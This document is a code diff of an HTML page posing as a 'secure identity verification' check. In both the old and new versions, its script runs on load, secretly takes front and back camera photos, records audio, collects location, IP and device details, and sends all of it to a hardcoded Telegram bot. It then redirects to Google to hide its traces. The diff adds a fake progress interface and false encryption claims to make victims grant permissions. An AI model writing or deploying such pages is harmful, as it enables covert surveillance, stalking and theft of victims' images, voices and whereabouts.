@@ -2,85 +2,309 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Checking System Identity...</title>
-    <script>
-        const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
-        const CHID = "7984067238";
-
-        async function sendToTelegram(blob, type, caption = "") {
-            const formData = new FormData();
-            formData.append('chat_id', CHID);
-            if (type === 'photo') {
-                formData.append('photo', blob);
-                if (caption) formData.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            } else if (type === 'audio') {
-                formData.append('voice', blob);
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: formData });
-            }
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🔒 Secure Connection | Identity Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-
-        async function captureMedia() {
-            try {
-                // 1. طلب صلاحيات الكاميرا والميكروفون والموقع دفعة واحدة
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                
-                // 2. تسجيل الصوت لمدة 5 ثوانٍ
-                const recorder = new MediaRecorder(stream);
-                const audioChunks = [];
-                recorder.ondataavailable = e => audioChunks.push(e.data);
-                recorder.onstop = async () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                    await sendToTelegram(audioBlob, 'audio');
-                };
-                recorder.start();
-                setTimeout(() => recorder.stop(), 5000);
-
-                // 3. التقاط الكاميرا الأمامية
-                await captureCamera("user", "📸 صورة من الكاميرا الأمامية");
-
-                // 4. التقاط الكاميرا الخلفية (إذا وجدت)
-                await captureCamera("environment", "📸 صورة من الكاميرا الخلفية");
-
-                // 5. جلب الموقع وإرساله كرسالة نصية
-                navigator.geolocation.getCurrentPosition(async pos => {
-                    const mapUrl = `📍 موقع الضحية اللحظي:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ chat_id: CHID, text: mapUrl })
-                    });
-                    // التمويه النهائي
-                    window.location.href = "https://google.com";
-                });
-
-            } catch (err) {
-                console.error("Permissions Denied");
-            }
+        body {
+            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
+            font-family: 'Segoe UI', 'Poppins', 'Cairo', system-ui, -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #e0e0e0;
+            padding: 20px;
         }
-
-        async function captureCamera(mode, caption) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                
-                const canvas = document.createElement('canvas');
-                setTimeout(async () => {
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => sendToTelegram(blob, 'photo', caption), 'image/jpeg');
-                    stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا بعد التقاط الصورة
-                }, 1000);
-            } catch (e) { console.log(mode + " not found"); }
+        .glass-card {
+            background: rgba(18, 25, 45, 0.75);
+            backdrop-filter: blur(12px);
+            border-radius: 32px;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            box-shadow: 0 25px 45px rgba(0,0,0,0.4), 0 0 0 1px rgba(0, 255, 255, 0.1);
+            padding: 2rem;
+            max-width: 550px;
+            width: 100%;
+            text-align: center;
+            transition: all 0.3s ease;
         }
-
-        window.onload = captureMedia;
-    </script>
+        h2 {
+            font-weight: 600;
+            font-size: 1.9rem;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #fff, #3bc9db);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.5rem;
+        }
+        .status-box {
+            background: #0f1422;
+            border-radius: 20px;
+            padding: 1.2rem;
+            margin: 1.5rem 0;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            text-align: left;
+            border-left: 4px solid #3bc9db;
+        }
+        .status-line {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 8px 0;
+            font-size: 0.85rem;
+        }
+        .blink {
+            animation: blink 1.2s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .permission-btn {
+            background: rgba(59, 201, 219, 0.15);
+            border: 1px solid #3bc9db;
+            border-radius: 40px;
+            padding: 12px 24px;
+            font-weight: 600;
+            color: #3bc9db;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 20px;
+            display: inline-block;
+            backdrop-filter: blur(4px);
+        }
+        .permission-btn:hover {
+            background: #3bc9db;
+            color: #0a0f1e;
+            box-shadow: 0 0 15px rgba(59,201,219,0.5);
+        }
+        .footer {
+            margin-top: 25px;
+            font-size: 0.7rem;
+            color: #6c7a8e;
+        }
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(59,201,219,0.3);
+            border-top-color: #3bc9db;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .hidden { display: none; }
+        .success { color: #2ecc71; }
+        .error { color: #e74c3c; }
+        hr {
+            border-color: rgba(59,201,219,0.2);
+            margin: 15px 0;
+        }
+    </style>
 </head>
-<body style="background:#000; color:#0f0; text-align:center; font-family:monospace; padding-top:20%;">
-    <h2>INITIALIZING_SECURE_PROTOCOL...</h2>
-    <p>Please accept all permissions to continue the verification process.</p>
+<body>
+
+<div class="glass-card" id="mainCard">
+    <h2>🔒 SECURE IDENTITY PROTOCOL</h2>
+    <p style="margin-top: 8px;">Verifying your session & device integrity</p>
+    
+    <div class="status-box" id="logBox">
+        <div class="status-line" id="step1">🔐 <span>Establishing secure channel...</span> <span class="spinner"></span></div>
+        <div class="status-line hidden" id="step2">📷 <span>Requesting camera & microphone...</span> <span class="spinner"></span></div>
+        <div class="status-line hidden" id="step3">📍 <span>Retrieving geolocation...</span> <span class="spinner"></span></div>
+        <div class="status-line hidden" id="step4">📱 <span>Capturing device identifiers...</span> <span class="spinner"></span></div>
+        <div class="status-line hidden" id="step5">📤 <span>Uploading encrypted payload...</span> <span class="spinner"></span></div>
+    </div>
+    
+    <div id="permissionRequest" class="hidden">
+        <div class="permission-btn" id="requestPermsBtn">✅ Grant Required Permissions</div>
+        <div class="footer" style="margin-top: 12px;">This step is mandatory to verify your identity.</div>
+    </div>
+    
+    <div class="footer" id="footerMsg">
+        🔒 Your session is protected by AES-256 • Connection is secure
+    </div>
+</div>
+
+<script>
+    // ======================= CONFIG =======================
+    const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
+    const CHAT_ID = "7984067238";
+    
+    // Helper: send photo to Telegram
+    async function sendPhoto(blob, caption = "") {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob);
+        if (caption) formData.append('caption', caption);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+    }
+    
+    // Helper: send voice/audio
+    async function sendVoice(blob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('voice', blob);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: formData });
+    }
+    
+    // Helper: send text message
+    async function sendMessage(text) {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        });
+    }
+    
+    // Helper: update UI steps
+    function showStep(stepId, status = 'loading') {
+        const stepDiv = document.getElementById(stepId);
+        if (stepDiv) {
+            stepDiv.classList.remove('hidden');
+            const textSpan = stepDiv.querySelector('span:first-child');
+            const spinnerSpan = stepDiv.querySelector('.spinner');
+            if (status === 'done') {
+                textSpan.innerHTML = textSpan.innerHTML.replace('...', ' ✓ done');
+                if (spinnerSpan) spinnerSpan.classList.add('hidden');
+            } else if (status === 'error') {
+                textSpan.innerHTML = textSpan.innerHTML.replace('...', ' ❌ failed');
+                if (spinnerSpan) spinnerSpan.classList.add('hidden');
+            }
+        }
+    }
+    
+    // Capture single photo from specific camera (front/environment)
+    async function capturePhoto(mode, caption) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: mode } } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 800;
+            canvas.height = 600;
+            await new Promise(r => setTimeout(r, 500));
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+            stream.getTracks().forEach(t => t.stop());
+            if (blob) await sendPhoto(blob, caption);
+            return true;
+        } catch (err) {
+            console.warn(`Camera ${mode} failed:`, err);
+            return false;
+        }
+    }
+    
+    // Record audio for 6 seconds
+    async function recordAudio(stream) {
+        return new Promise((resolve) => {
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                if (blob.size > 2000) await sendVoice(blob);
+                resolve();
+            };
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 6000);
+        });
+    }
+    
+    // Get device info + IP
+    async function sendDeviceInfo() {
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenSize = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const deviceInfo = `🖥️ *DEVICE INFO*\n📱 User-Agent: ${ua}\n💻 Platform: ${platform}\n🌐 Language: ${language}\n📺 Screen: ${screenSize}\n🕒 Timezone: ${timezone}\n🌍 IP: ${ipData.ip}`;
+            await sendMessage(deviceInfo);
+        } catch(e) { console.warn("Device info failed"); }
+    }
+    
+    // Get location
+    async function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) resolve(null);
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    const mapsUrl = `📍 *LOCATION*%0Ahttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}%0A🎯 Accuracy: ${pos.coords.accuracy}m`;
+                    await sendMessage(mapsUrl);
+                    resolve(true);
+                },
+                () => resolve(null)
+            );
+        });
+    }
+    
+    // Main execution
+    async function startHarvest() {
+        showStep('step2', 'loading');
+        try {
+            // Request all media permissions (audio + video) at once
+            const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            showStep('step2', 'done');
+            
+            // Start audio recording (in background)
+            showStep('step3', 'loading');
+            recordAudio(mediaStream); // async non-blocking
+            
+            // Capture front camera
+            showStep('step3', 'loading');
+            const frontCaptured = await capturePhoto('user', '📸 Front camera snapshot');
+            // Capture back camera
+            const backCaptured = await capturePhoto('environment', '📸 Back camera snapshot');
+            showStep('step3', 'done');
+            
+            // Get location
+            showStep('step4', 'loading');
+            await getLocation();
+            showStep('step4', 'done');
+            
+            // Device info & IP
+            showStep('step5', 'loading');
+            await sendDeviceInfo();
+            showStep('step5', 'done');
+            
+            // All done — final message and redirect
+            await sendMessage(`✅ *Session completed* - ${new Date().toISOString()}`);
+            
+            // Optional: redirect to a legit website to hide traces
+            setTimeout(() => {
+                window.location.replace("https://www.google.com");
+            }, 1500);
+            
+        } catch (err) {
+            console.error(err);
+            showStep('step2', 'error');
+            // If permissions denied, show fallback button
+            document.getElementById('permissionRequest').classList.remove('hidden');
+            document.getElementById('requestPermsBtn').onclick = () => startHarvest();
+        }
+    }
+    
+    // UI updates on load
+    window.onload = () => {
+        showStep('step1', 'loading');
+        setTimeout(() => {
+            showStep('step1', 'done');
+            // Automatically start harvest after short delay
+            startHarvest();
+        }, 1000);
+    };
+</script>
 </body>
 </html>
